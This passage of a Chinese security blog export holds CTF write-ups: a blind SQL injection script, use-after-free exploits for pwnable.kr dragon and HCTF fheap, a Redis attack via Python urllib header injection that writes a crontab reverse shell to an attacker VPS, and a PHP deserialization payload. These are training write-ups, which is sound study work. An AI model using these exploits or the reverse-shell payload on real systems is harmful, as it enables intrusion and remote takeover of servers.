&lt;p&gt;还有个坑js脚本里面有标签的时候，会解析报错。 &lt;br&gt; 这里把他注释掉,就可以了 这个是我脑洞出来的，不过很有效果，因为html不执行//&lt;/br&gt;&lt;/p&gt; &lt;p&gt;最后收到一发XSS信息 &lt;br&gt; &lt;img alt=&quot;这里写图片描述&quot; src=&quot;http://img.blog.csdn.net/20170625074459255?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast&quot; title=&quot;&quot;/&gt;&lt;/br&gt;&lt;/p&gt; &lt;h2 id=&quot;0x05-register&quot;&gt;0x05 register&lt;/h2&gt; &lt;p&gt;这道题给了提示之后还是没有做出来，主要是卡在了不知道country字段，影响了什么。这才是二次注入的关键点，最后得知是影响了时间，瞬间有了思路，但还是不知道有什么表这里利用猜测的办法猜到数据表是users &lt;br&gt; 于是就可以利用时间的不同进行盲注 &lt;br&gt; 下面贴出盲注脚本&lt;/br&gt;&lt;/br&gt;&lt;/p&gt; &lt;pre class=&quot;prettyprint&quot;&gt;&lt;code class=&quot; hljs python&quot;&gt;&lt;span class=&quot;hljs-comment&quot;&gt;# coding:utf-8&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; requests &lt;span class=&quot;hljs-keyword&quot;&gt;from&lt;/span&gt; math &lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; ceil &lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; re &lt;span class=&quot;hljs-keyword&quot;&gt;from&lt;/span&gt; random &lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; * &lt;span class=&quot;hljs-keyword&quot;&gt;global&lt;/span&gt; string string = &lt;span class=&quot;hljs-string&quot;&gt;&#39;&#39;&lt;/span&gt; &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;dichotomie&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(l,r,i)&lt;/span&gt;:&lt;/span&gt;&lt;span class=&quot;hljs-comment&quot;&gt;#利用二分法查找&lt;/span&gt; mid = (l+r)/&lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;hljs-comment&quot;&gt;# print &quot;l and r ,mid:&quot;,l,r,mid&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; l == r: &lt;span class=&quot;hljs-keyword&quot;&gt;global&lt;/span&gt; string string += chr(r) &lt;span class=&quot;hljs-keyword&quot;&gt;print&lt;/span&gt; string &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; charge(mid,i):&lt;span class=&quot;hljs-comment&quot;&gt;#&amp;lt;=&lt;/span&gt; &lt;span class=&quot;hljs-comment&quot;&gt;#print 0&lt;/span&gt; dichotomie(l,mid,i) &lt;span class=&quot;hljs-keyword&quot;&gt;else&lt;/span&gt;: &lt;span class=&quot;hljs-comment&quot;&gt;#print 1&lt;/span&gt; dichotomie(int(ceil((l+r)*&lt;span class=&quot;hljs-number&quot;&gt;1.0&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;)),r,i) &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;charge&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(mid,i)&lt;/span&gt;:&lt;/span&gt; payload = &lt;span class=&quot;hljs-string&quot;&gt;&quot;&#39;or(select(ascii(substr(group_concat(c),{}))&amp;lt;={}) from (select 1,2,3c,4,5 union(select*from(users)))b`) #”.format(i,mid) login = requests.session() username = “4ct10n”+str(randint(1,10000000)) data = { ‘username’:username, ‘password’:‘1’, ‘address’:‘1’, ‘country’:payload } login.post(‘http://39.108.192.25:5005/register.php‘,data=data) data = { ‘username’:username, ‘password’:‘1’ } login.post(‘http://39.108.192.25:5005/login.php‘,data=data) res = login.get(‘http://39.108.192.25:5005/index.php?page=info‘) string = res.content r = re.findall(‘2017-07-01 (.*)&lt;/em&gt;’,string)[0][0:2] # print r if r == ‘05’: return 0 else: return 1 # print datafor i in range(1,100): dichotomie(32,127,i)print string]]></content>
      <tags>
        <tag>write-up</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwnable dragon]]></title>
    <url>%2F2017%2F06%2F24%2Fpwnable%20dragon%2F</url>
    <content type="text"><![CDATA[借着这段时间学UAF，又找了一道UAF的题目做了一下，这个题目很简单，看着WP写的，思路也非常的清晰。 借着这段时间学UAF，又找了一道UAF的题目做了一下，这个题目很简单，看着WP写的，思路也非常的清晰。题目地址： nc pwnable.kr 9004 题目下载： http://pwnable.kr/bin/dragon0x01 简单分析这题是让我们打龙，首先利用IDA查看龙的相关信息 上面是两个龙的结构体又发现了一个神秘关卡 里面有要获取的shell发现在杀死龙之后会释放龙内存，同时也会重新申请相同大小的内存进行写入而且偏移量正好是龙结构体的函数指针处。这样我们就能利用UAF（释放重利用）控制整个程序流。下面第一个难题是怎样杀死一条龙。0x02 屠龙Priest Knight 我们发现如果是直接想把龙打死是不可能的但是我们发现了一个技能Priest的3技能 可以是龙的回升.同时发现大龙的血是80 一个字节127可以使其溢出，从而把大龙打死。0x03 编写expfrom pwn import *sh = remote(‘pwnable.kr’,9004) #process(‘./dragon’)def killself(sh): for i in range(0,3): sh.send(‘1’+‘\n’)def killdragon(sh): for i in range(0,4): sh.send(‘3’+‘\n’) sh.send(‘3’+‘\n’) sh.send(‘2’+‘\n’)killself(sh)sh.send(‘1’+‘\n’)killdragon(sh)sh.send(p32(0x08048DBF))sh.interactive()]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[UAF (Use After Free)漏洞分析及利用]]></title>
    <url>%2F2017%2F06%2F23%2FUAF%20(Use%20After%20Free)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8%2F</url>
    <content type="text"><![CDATA[因为大作业的需求要调试一个浏览器的UAF漏洞，首先必须对UAF漏洞有个整体的了解，本篇文章主要讲解UAF造成的原因以及利用方法，这里结合2016年HCTF fheap 因为大作业的需求要调试一个浏览器的UAF漏洞，首先必须对UAF漏洞有个整体的了解，本篇文章主要讲解UAF造成的原因以及利用方法，这里结合2016年HCTF fheap 题目分析起来还是有点耐人寻味。0x01 UAF 原理这里首先放一段简单的c代码，让大家更容易理解（linux 环境）#include &lt;stdio.h&gt;#include &lt;cstdlib&gt;#include &lt;string.h&gt;int main(){ char p1; p1 = (char ) malloc(sizeof(char)10);//申请内存空间 memcpy(p1,“hello”,10); printf(“p1 addr:%x,%s\n”,p1,p1); free(p1);//释放内存空间 char p2; p2 = (char )malloc(sizeof(char)10);//二次申请内存空间，与第一次大小相同，申请到了同一块内存 memcpy(p1,“world”,10);//对内存进行修改 printf(“p2 addr:%x,%s\n”,p2,p1);//验证 return 0;}如上代码所示1.指针p1申请内存，打印其地址值 2.然后释放p1 3.指针p2申请同样大小的内存，打印p2的地址，p1指针指向的值Gcc编译，运行结果如下： p1与p2地址相同，p1指针释放后，p2申请相同的大小的内存，操作系统会将之前给p1的地址分配给p2，修改p2的值，p1也被修改了。重温程序，看注释根本原因应用程序调用free()释放内存时，如果内存块小于256kb，dlmalloc并不马上将内存块释放回内存，而是将内存块标记为空闲状态。这么做的原因有两个：一是内存块不一定能马上释放会内核（比如内存块不是位于堆顶端），二是供应用程序下次申请内存使用（这是主要原因）。当dlmalloc中空闲内存量达到一定值时dlmalloc才将空闲内存释放会内核。如果应用程序申请的内存大于256kb，dlmalloc调用mmap()向内核申请一块内存，返回返还给应用程序使用。如果应用程序释放的内存大于256kb，dlmalloc马上调用munmap()释放内存。dlmalloc不会缓存大于256kb的内存块，因为这样的内存块太大了，最好不要长期占用这么大的内存资源。简单讲就是第一次申请的内存空间在释放过后没有进行内存回收，导致下次申请内存的时候再次使用该内存块，使得以前的内存指针可以访问修改过的内存。0x02 漏洞的简单利用还是先放一段程序（linux x86）#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;typedef void (func_ptr)(char );void evil_fuc(char command[]){system(command);}void echo(char content[]){printf(“%s”,content);}int main(){ func_ptr p1=(func_ptr)malloc(4sizeof(int)); printf(“malloc addr: %p\n”,p1); p1[3]=echo; p13; free(p1); //在这里free了p1,但并未将p1置空,导致后续可以再使用p1指针 p13; //p1指针未被置空,虽然free了,但仍可使用. func_ptr p2=(func_ptr)malloc(4sizeof(int));//malloc在free一块内存后,再次申请同样大小的指针会把刚刚释放的内存分配出来. printf(“malloc addr: %p\n”,p2); printf(“malloc addr: %p\n”,p1);//p2与p1指针指向的内存为同一地址 p2[3]=evil_fuc; //在这里将p1指针里面保存的echo函数指针覆盖成为了evil_func指针. p13; return 0;}运行效果 最后成功获取shell 具体的解释注释里面很清楚，详见注释0x03 2016HCTF fheap用了一天的时间调试程序，这里参考了FlappyPig与官方的详细题解，但是总觉的说的不够清楚，有些地方理所当然，作为小白根本看不懂。结合着自己的漏洞调试经验写出详细的分析过程，供大家参考。0x1 题目分析整个题目做下来利用到了很多知识点，这里列举一下UAF 二次释放&amp; fastbin的特性64位格式化字符串漏洞无libc地址泄露，DynELF主要运用的就是以上三点，首先寻找UAF可执行任意函数漏洞，其次利用puts函数寻找基址，接着利用printf格式化字符串进行内存泄露，最后UAF执行system函数0x2 申请&amp;释放 代码在编写的时候注意，输入顺序，利用recvuntil控制输入流程申请代码def create(size,content): p.recvuntil(“quit”) p.send(“create “) p.recvuntil(“size:”) p.send(str(size)+‘\n’) p.recvuntil(‘str:’) p.send(content) p.recvuntil(‘\n’)[:-1]释放代码def delete(idx): p.recvuntil(“quit”) p.send(“delete “) p.recvuntil(‘id:’) p.send(str(idx)+‘\n’) p.recvuntil(‘sure?:’) p.send(‘yes ‘+‘\n’)0x3 UAF漏洞查找程序自己实现了一套管理字符串的体系，但是在释放的时候用指针是否为空来判断该索引代表地方是否存放有字符串，如果指针不空，表示可以释放。但是释放完后，没有将指针置空，因此导致可以二次释放，多次释放。最后在释放内存之后，在delete后并没有置空，存在double free0x4 利用UAF修改函数地址首先我们了解一下本题的uaf漏洞，这里利用图片的形式展示一下关系1.fastbin特性fastbin维护的chunk分九个档次，大小从16字节到80字节，每8个字节一个档次。那我们要求的0x20（32）个字节，属于48字节的档次（因为每个chunk还要加上16字节的管理区），所以我们申请0x20空间后释放的chunk被归到fastbin[5]这个链表中了。2.内存分布利用gbd动态调试查看结构体内存 最后一个就是freeshort函数指针总思路：首先是利用uaf，利用堆块之间申请与释放的步骤，形成对free_func指针的覆盖。从而达到劫持程序流的目的。具体来说，先申请的是三个字符创小于0xf的堆块，并将其释放。此时fastbin中空堆块的单链表结构如下左图，紧接着再申请一个字符串长度为0x20的字符串，此时，申请出来的堆中的数据会如下右图，此时后面申请出来的堆块与之前申请出来的1号堆块为同一内存空间，这时候输入的数据就能覆盖到1号堆块中的free_func指针，指向我们需要执行的函数，随后再调用1号堆块的free_func函数，即实现了劫持函数流的目的。0x5 泄露基址我们要知道堆的释放是一个先入后出的队列，也就是说你第最后一个释放，那么就地一个用，就本体而言首先申请三个堆块 ，其实两个就可以 create(4,‘aa’) create(4,‘bb’) delete(1) delete(0)通过调用puts函数打印该函数的地址（一开始我不怎么理解），为什么是覆盖成2d为什么不是1a等其他puts函数的地址，自己调试一下就知道了。 data=’a’0x10+’b’0x8+’\x2d’#第一次覆盖，泄露出函数地址。 create(0x20,data)#在这里连续创建两个堆块，从而使输入的data与前面的块1公用一块内存。个堆块，从而使输入的data与前面的块1公用一块内存。 delete(1)#这里劫持函数程序流function puts running p.recvuntil(‘b’0x8) data=p.recvuntil(‘1.’)[:-2] print data if len(data)&gt;8: data=data[:8] data=u64(data.ljust(8,’\x00’))-0xA000000000000 #这里减掉的数可能不需要，自行调整 print hex(data) proc_base=data-0xd2d print “proc base”,hex(proc_base)找到了plt表的基地址，下面就是对于格式化字符串的利用6.格式化字符串我们想要知道system的地址，在没有libc的环境下，利用格式化字符串泄露内存地址从而得到system的加载地址格式化字符串的洞，一开始不知道怎么发现的。但想了一下，格式化字符串的洞必须满足以下条件， 1. 用户的输入必须能打印 2. 用户输入的字符串在printf函数栈的上方（先压栈）就这两个条件我们很快可以分析出漏洞的点就在create &amp; delete 函数 我们首先create字符串调用delete 此时freeshort地址变成了printf，可以控制打印 但是我们的参数放在哪里呢？ 我们又发现当输入yes时yes字符串在堆栈的位置正好是printf的上方下面找一下printf的偏移 64位的格式化字符串 参见我的另一篇博客 找到偏移是9 这时编写leak函数def leak(addr): delete_str(0) payload = ‘a%9$s’.ljust(0x18,‘#’) + p64(printf_addr) create_str(0x20,payload) sh.recvuntil(“quit”) sh.send(“delete “) sh.recvuntil(“id:”) sh.send(str(1)+‘\n’) sh.recvuntil(“?:”) sh.send(“yes.1111”+p64(addr)+“\n”) sh.recvuntil(‘a’) data = sh.recvuntil(‘####’)[:-4] if len(data) == 0: return ‘\x00’ if len(data) &lt;= 8: print hex(u64(data.ljust(8,‘\x00’))) return data0x7 泄露system地址并使用 #step 5 leak system addr create_str(0x20,payload) delete_str(1)#this one can not be ignore because DynELF use the delete_str() at begin d = DynELF(leak, base_addr, elf=ELF(‘./pwn-f’)) system_addr = d.lookup(‘system’, ‘libc’) print ‘system_addr:’+hex(system_addr) #step 6 recover old function to system then get shell delete_str(0) create_str(0x20,‘/bin/bash;’.ljust(0x18,‘#’)+p64(system_addr))#attention /bin/bash; i don`t not why add the ‘;’ delete_str(1) sh.interactive()0x8 完整代码from pwn import sh = process(‘./pwn-f’)def create_str(size,str1): sh.recvuntil(“quit”) sh.send(“create “) sh.recvuntil(“size:”) sh.send(str(size)+‘\n’) sh.recvuntil(“str:”) sh.send(str1)#here why can not i user ‘\n’ # print ‘|’,sh.recvuntil(‘\n’)[:-1],’|’def delete_str(idn): sh.recvuntil(“quit”) sh.send(“delete “) sh.recvuntil(“id:”) sh.send(str(idn)+‘\n’) sh.recvuntil(“?:”) sh.send(“yes”+“\n”)def leak(addr): delete_str(0) payload = ‘a%9$s’.ljust(0x18,‘#’) + p64(printf_addr) create_str(0x20,payload) sh.recvuntil(“quit”) sh.send(“delete “) sh.recvuntil(“id:”) sh.send(str(1)+‘\n’) sh.recvuntil(“?:”) sh.send(“yes.1111”+p64(addr)+“\n”) sh.recvuntil(‘a’) data = sh.recvuntil(‘####’)[:-4] if len(data) == 0: return ‘\x00’ if len(data) &lt;= 8: print hex(u64(data.ljust(8,‘\x00’))) return datadef main(): global printf_addr#set global printf addr cus leak() use it #step 1 create &amp; delete create_str(4,‘aa’) create_str(4,‘aa’) delete_str(1) delete_str(0) #step 2 recover old function addr pwn = ELF(‘./pwn-f’) payload = “aaaaaaaa”.ljust(0x18,‘b’)+‘\x2d’# recover low bits,the reason why i choose \x2d is that the system flow decide by create_str(0x20,payload) delete_str(1) #step 3 leak base addr sh.recvuntil(‘b’*0x10) data = sh.recvuntil(‘\n’)[:-1] if len(data)&gt;8: data=data[:8] data = u64(data.ljust(0x8,‘\x00’))# leaked puts address use it to calc base addr base_addr = data - 0xd2d #step 4 get printf func addr printf_offset = pwn.plt[‘printf’] printf_addr = base_addr + printf_offset #get real printf addr delete_str(0) #step 5 leak system addr create_str(0x20,payload) delete_str(1)#this one can not be ignore because DynELF use the delete_str() at begin d = DynELF(leak, base_addr, elf=ELF(‘./pwn-f’)) system_addr = d.lookup(‘system’, ‘libc’) print ‘system_addr:’+hex(system_addr) #step 6 recover old function to system then get shell delete_str(0) create_str(0x20,‘/bin/bash;’.ljust(0x18,‘#’)+p64(system_addr))#attention /bin/bash; i don`t not why add the ‘;’ delete_str(1) sh.interactive()if name == ‘main‘: print 1 main()]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[验证码机制与实现]]></title>
    <url>%2F2017%2F06%2F16%2F%E9%AA%8C%E8%AF%81%E7%A0%81%E6%9C%BA%E5%88%B6%E4%B8%8E%E5%AE%9E%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[时下图形验证码的应用已经非常广泛了，无论是在web应用还是客户端软件中。主要是用来防止字典攻击（或称暴力猜解）、机器注册等 本篇文章主要讲解验证码实现机制与安全策略突破 时下图形验证码的应用已经非常广泛了，无论是在web应用还是客户端软件中。主要是用来防止字典攻击（或称暴力猜解）、机器注册等 本篇文章主要讲解验证码实现机制与安全策略突破0x01 原理分析1.客户端发起一个请求； 2.服务端响应并创建一个新的SessionID同时生成一个随机验证码； 3.服务端将验证码和SessionID一并返回给客户端； 4.客户端提交验证码连同SessionID给服务端； 5.服务端验证验证码同时销毁当前Session中的验证码，返回给客户端结果。0x02 代码实现这里用了网上的一个例子 login.html&lt;!DOCTYPE html PUBLIC “-//W3C//DTD XHTML 1.0 Transitional//EN” “http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&amp;gt;&lt;html xmlns=“http://www.w3.org/1999/xhtml“&gt;&lt;head&gt;&lt;meta http-equiv=“Content-Type” content=“text/html; charset=utf-8” /&gt;&lt;title&gt;无标题文档&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form method=“post” action=“./check.php”&gt; &lt;p&gt;验证码: &lt;img id=“captcha_img” border=‘1’ src=‘./image.php?r=echo rand(); ?&gt;’ style=“width:100px; height:30px” /&gt; &lt;a onclick=“document.getElementById(‘captcha_img’).src=’./image.php?r=’+Math.random()”&gt;换一个?&lt;/a&gt; &lt;/p&gt; &lt;P&gt;请输入验证码:&lt;input type=“text” name=‘authcode’ value=‘’/&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=‘submit’ value=‘提交’ style=‘padding:6px 5px;’/&gt;&lt;/p&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;check.php&lt;?php header(“Content-Type:text/html;charset=utf-8”); //设置头部信息 //isset()检测变量是否设置 if(isset($_REQUEST[‘authcode’])){ session_start(); //strtolower()小写函数 echo var_dump($_POST[‘authcode’]),var_dump($_SESSION[‘authcode’]); if($_POST[‘authcode’] === $_SESSION[‘authcode’]){ //跳转页面 echo “&lt;script language=\”javascript\”&gt;”; echo “alert(‘yes!”.$_REQUEST[‘authcode’].“‘);”; echo “document.location=\”./login.html\””; echo “&lt;/script&gt;”; }else{ //提示以及跳转页面 echo “&lt;script language=\”javascript\”&gt;”; echo “alert(‘输入错误!”.$_REQUEST[‘authcode’].“‘);”; echo “document.location=\”./login.html\””; echo “&lt;/script&gt;”; } exit(); } ?&gt;image.php&lt;?php //11&gt;设置session,必须处于脚本最顶部 session_start(); $image = imagecreatetruecolor(100, 30); //1&gt;设置验证码图片大小的函数 //5&gt;设置验证码颜色 imagecolorallocate(int im, int red, int green, int blue); $bgcolor = imagecolorallocate($image,255,255,255); //#ffffff //6&gt;区域填充 int imagefill(int im, int x, int y, int col) (x,y) 所在的区域着色,col 表示欲涂上的颜色 imagefill($image, 0, 0, $bgcolor); //10&gt;设置变量 $captcha_code = “”;//7&gt;生成随机的字母和数字 for($i=0;$i&lt;4;$i++){ //设置字体大小 $fontsize = 8; //设置字体颜色，随机颜色 $fontcolor = imagecolorallocate($image, rand(0,120),rand(0,120), rand(0,120)); //0-120深颜色 //设置需要随机取的值,去掉容易出错的值如0和o $data =‘abcdefghigkmnpqrstuvwxy3456789’; //取出值，字符串截取方法 strlen获取字符串长度 $fontcontent = substr($data, rand(0,strlen($data)),1); //10&gt;.=连续定义变量 $captcha_code .= $fontcontent; //设置坐标 $x = ($i*100/4)+rand(5,10); $y = rand(5,10); imagestring($image,$fontsize,$x,$y,$fontcontent,$fontcolor); } //10&gt;存到session $_SESSION[‘authcode’] = $captcha_code; //8&gt;增加干扰元素，设置雪花点 for($i=0;$i&lt;200;$i++){ //设置点的颜色，50-200颜色比数字浅，不干扰阅读 $pointcolor = imagecolorallocate($image,rand(50,200), rand(50,200), rand(50,200)); //imagesetpixel — 画一个单一像素 imagesetpixel($image, rand(1,99), rand(1,29), $pointcolor); } //9&gt;增加干扰元素，设置横线 for($i=0;$i&lt;4;$i++){ //设置线的颜色 $linecolor = imagecolorallocate($image,rand(80,220), rand(80,220),rand(80,220)); //设置线，两点一线 imageline($image,rand(1,99), rand(1,29),rand(1,99), rand(1,29),$linecolor); } //2&gt;设置头部，image/png header(‘Content-Type: image/png’); //3&gt;imagepng() 建立png图形函数 imagepng($image); //4&gt;imagedestroy() 结束图形函数 销毁$image //imagedestroy($image); ?&gt;会生成image图片以及session值0x03 效果展示0x04 攻击手段这里就不详细阐述了 可以参考freebuf上的一篇文章]]></content>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hack Redis via Python urllib HTTP Header Injection]]></title>
    <url>%2F2017%2F06%2F16%2FHack%20Redis%20via%20Python%20urllib%20HTTP%20Header%20Injection%2F</url>
    <content type="text"><![CDATA[本篇文章带来的是python低版本的urllib 头部注入，攻击目标为局域网内的Redis，结合着一道CTF实例，演示整个攻击过程 本篇文章带来的是python低版本的urllib 头部注入，攻击目标为局域网内的Redis，结合着一道CTF实例，演示整个攻击过程0x01 简介0x02 环境搭建0x03 题目分析0x1 ssrf0x2 python urllib 注入docker 1docker 20x3 redis攻击方式webshell利用redis写恶意命令接收反弹的shell0x01 简介2016年6月BLINDSPOT披露了Python urllib http头注入漏洞：http://blog.blindspotsecurity.com/2016/06/advisory-http-header-injection-in.html 通过这个漏洞，如果使用了Python的urllib库，并且请求的url为用户可控，那么就可能存在内网被探测的风险，如果本机或内网服务器中装有未授权访问的redis，那么服务器则有被getshell的风险。0x02 环境搭建利用2016hctf ATfeild 源码搭建 https://github.com/LoRexxar/hctf2016_atfield主机ip配置本机172.17.0.1Ubuntu:16.04docker1172.17.0.2Ubuntu:16.04 python2.7.6（源码编译）docker2172.17.0.4centos:6 redis2.4.30x03 题目分析整个题目只有一个输入框 要求输入图片的url ，后台的访问过程因该是直接去请求文件 打印出来的image地址很可疑 怀疑是ssrf下一步就是寻找内网主机0x1 ssrf这里我们测试能发现，并不允许ip的请求，也就是描述中所说的，请求必须符合.tld标准并且包含域名，如果想要请求127.0.0.1，我们这里有两种绕过方式1、 http://www.127.0.0.1.xip.io这种方式可以自动把域名指向中间的ip，在一些特殊情况下非常好用2、 http://xxxxx/?u=http://127.0.0.1在有域名的vps上写一个跳转页面实现，事实上，只有第二种做法可以顺利继续做下一题这里采用两种方法结合的方式 构造http://www.vps.xip.io/302.php?u=http://127.0.0.10x2 python urllib 注入该漏洞的前提python版本为python3 &lt; 3.4.3 || python2 &lt; 2.7.9 （ps 这里python版本必须是自己编译的，虽然不知道为什么？？？）首先我们了解一下什么是python urllib 注入1. docker 1是对外开放的web服务器端 编写请求脚本#!/usr/bin/env python # encoding: utf-8import sysimport urllib2url = sys.argv[1]info = urllib2.urlopen(url) 通过发送请求 达到恶意数据被执行 python a.py http://172.17.0.3%0d%0aset%20a%2012345%0d%0a:8888/ 首先在docker2中nc -lp 8888端口 观察现象 发现中间的字符串正常的解析了，正好是一组redis命令2.docker 2是内网中的服务器，里面有redis以及crontab任务管理 docker2中开启了redis服务如果刚才docker1中的请求端口是6379，那么就会吧aa变量加入到集合中，从而能证明header注入redis是否成功 最后看截图 成功解析语句并执行0x3 redis攻击方式首先整体的思路是用户通过操作docker1去访问docker2其中的数据具有恶意性，并且可以在docker2中解析执行，从而在docker2中进行破坏最后拿到webshell，系统管理权限1.webshell利用最经典的webshell获取方法 通过1.2.2 我们能够绕过过滤，在通过1.2.1我们能够构造payload写入信息redis，再加上提示说有crontab，这样我们就可以通过redis来写crontab文件然后反弹shell。正常我们在bash下反弹shell是这样子的命令/bin/bash -i &gt;&amp; /dev/tcp/ip地址/端口号 0&gt;&amp;1 写成计划任务形式，即crontab文件形式/1 /bin/bash -i &gt;&amp; /dev/tcp/ip地址/端口号 0&gt;&amp;1代表每分钟执行一次2.利用redis写恶意命令通常来说我们在使用redis写文件方法如下：set 11 “/1 /bin/bash -i &gt;&amp; /dev/tcp/ip地址/端口号 0&gt;&amp;1”config set dir /var/spool/cronconfig set dbfilename rootsave但本题采取了另一个方式 因为redis不会识别空格（1） set 11 “\n/1 /bin/bash -i &gt;&amp; /dev/tcp/(vps address)/12345 0&gt;&amp;1\n” 3 //表示有三个参数$3 //下面这个参数长度为3set$1 //下面这个参数长度为1a$64 //下面这个参数长度为64\n/1 /bin/bash -i &gt;&amp; /dev/tcp/(vps address)/12345 0&gt;&amp;1\n这里\n在传输的时候替换成%0a，所以我们要传入的明文子串如下：link=http://www.(vps address).xip.io/302.php?url=http://172.17.0.43$3set$1a$64/1 * /bin/bash -i &gt;&amp; /dev/tcp/(vps address)/12345 0&gt;&amp;1config set dir /var/spool/cronconfig set dbfilename rootsave:6379/不能直接发送过去 ，首先进行进行URL编码转换，应该转换几次呢？ 答案是3次 用户web浏览器一次/跳转一次/内网请求一次 在换行时必须采用%0d%0a 那么最后的形式是将下面的link再转码两次link=http://www.(vps address).xip.io/302.php?url=http://172.17.0.4%0d%0A%0d%0A%2a3%0d%0A%243%0d%0Aset%0d%0A%241%0d%0Aa%0d%0A%2464%0d%0A%0a%2a%2f1%20%2a%20%2a%20%2a%20%2a%20%2fbin%2fbash%20-i%20%3E%26%20%2fdev%2ftcp%2f(vps address)%2f12345%200%3E%261%0a%0d%0Aconfig%20set%20dir%20%2fvar%2fspool%2fcron%0d%0Aconfig%20set%20dbfilename%20root%0d%0Asave%0d%0A:6379/利用crul 方法发送出去curl -d “link=http%3A%2f%2fwww.(vps address).xip.io%2f302.php%3Furl%3Dhttp%253A%252f%252f172.17.0.3%25250d%25250A%25250d%25250A%25252a3%25250d%25250A%2525243%25250d%25250Aset%25250d%25250A%2525241%25250d%25250Aa%25250d%25250A%25252464%25250d%25250A%25250a%25252a%25252f1%252520%25252a%252520%25252a%252520%25252a%252520%25252a%252520%25252fbin%25252fbash%252520-i%252520%25253E%252526%252520%25252fdev%25252ftcp%25252f(vps address)%25252f12345%2525200%25253E%2525261%25250a%25250d%25250Aconfig%252520set%252520dir%252520%25252fvar%25252fspool%25252fcron%25250d%25250Aconfig%252520set%252520dbfilename%252520root%25250d%25250Asave%25250d%25250A%253A6379%252f“ “http://172.17.0.4:8000/show“ -v -L执行结果如下 成功执行 观察 redis端的情况 成功实现计划任务的写入 下面就是vps接受反弹的shell3.接收反弹的shell]]></content>
      <tags>
        <tag>write-up</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2017 GCTF Web WriteUp]]></title>
    <url>%2F2017%2F06%2F15%2F2017%20GCTF%20Web%20WriteUp%2F</url>
    <content type="text"><![CDATA[比赛的时候没来的及做听说很简单 比赛的时候没来的及做听说很简单0x01 条件竞争看了逻辑之后就是个简单的竞争题目 利用burp爆破即可 reset login 最后得到flag 0x02 PHP序列化这一题也是比较老套的题目，看具体的分析过程 在主页面 使用的session解析方式是 ini_set(‘session.serialize_handler’, ‘php_serialize’); 在query.php界面是php的默认解析方式 具体的区别参照我以前写的博客0x1 执行流程在主页输入的src参数作为session的值存入服务器，当访问query.php时因为解析方法的不同使得session中的序列化的类被反序列化，因存在魔法函数导致了一系列的函数的执行，从而造成攻击0x2 代码分析找到备份文件query.php~/**////query.php 閮ㄥ垎浠ｇ爜session_start();header(‘Look me: edit by vim ~0~’)//……class TOPA{ public $token; public $ticket; public $username; public $password; function login(){ //if($this-&gt;username == $USERNAME &amp;&amp; $this-&gt;password == $PASSWORD){ //鎶辨瓑 $this-&gt;username ==‘aaaaaaaaaaaaaaaaa’ &amp;&amp; $this-&gt;password == ‘bbbbbbbbbbbbbbbbbb’){ return ‘key is:{‘.$this-&gt;token.‘}’; } }}class TOPB{ public $obj; public $attr; function construct(){ $this-&gt;attr = null; $this-&gt;obj = null; } function toString(){ $this-&gt;obj = unserialize($this-&gt;attr); $this-&gt;obj-&gt;token = $FLAG; if($this-&gt;obj-&gt;token === $this-&gt;obj-&gt;ticket){ return (string)$this-&gt;obj; } }}class TOPC{ public $obj; public $attr; function wakeup(){ $this-&gt;attr = null; $this-&gt;obj = null; } function destruct(){ echo $this-&gt;attr; }} / 大致的流程反序列化TOPC执行echo TOPB 触发TOPB的tostring方法，TOPB自带反序列化TOPA的函数，反序列化A后return 触发TOPA中的tostring0x3 bypassTOPC的function __wakeup(){ $this-&gt;attr = null; $this-&gt;obj = null; }需要绕过，方法利用序列化变量值不同TOPB的if($this-&gt;obj-&gt;token === $this-&gt;obj-&gt;ticket)不是弱类型比较，利用引用的方法0x4 payload生成$a = new TOPA();$a-&gt;token = &amp;$a-&gt;ticket;$a-&gt;username = ‘aaaaaaaaaaaaaaaaa’;$a-&gt;password = ‘bbbbbbbbbbbbbbbbbb’;//这里在代码逻辑上是不用给username&amp;password赋值的，估计是函数写错了 ，还有login函数是怎么触发的，如果是tostring函数逻辑上就将通了$b = new TOPB();$b-&gt;attr = serialize($a);$c = new TOPC();$c-&gt;attr = $b;echo serialize($c));0x5 利用在首页输入src=|O:4:”TOPC”:3:{s:3:”obj”;N;s:4:”attr”;O:4:”TOPB”:2:{s:3:”obj”;N;s:4:”attr”;s:127:”O:4:”TOPA”:4:{s:5:”token”;N;s:6:”ticket”;R:2;s:8:”username”;s:17:”aaaaaaaaaaaaaaaaa”;s:8:”password”;s:18:”bbbbbbbbbbbbbbbbbb”;}”;}} 